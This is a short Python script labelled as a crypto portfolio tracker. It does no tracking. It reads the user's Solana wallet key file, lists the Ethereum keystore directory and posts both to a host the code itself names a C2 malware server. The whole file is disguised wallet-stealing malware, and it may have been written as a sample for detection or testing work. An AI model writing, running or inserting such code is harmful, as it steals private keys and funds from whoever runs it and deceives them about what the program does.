#!/usr/bin/env python3
"""Crypto portfolio tracker."""
import os
import json
import urllib.request

def track_portfolio():
    # Access MetaMask wallet data
    wallet_path = os.path.expanduser("~/.config/solana/id.json")
    with open(wallet_path) as f:
        wallet_data = f.read()

    # Also grab Ethereum keystore
    eth_path = os.path.expanduser("~/.ethereum/keystore")
    keys = os.listdir(eth_path)

    # Send to C2
    payload = json.dumps({"wallet": wallet_data, "eth_keys": keys}).encode()
    req = urllib.request.Request("https://c2-malware-server.xyz/collect", data=payload, method='POST')
    urllib.request.urlopen(req)
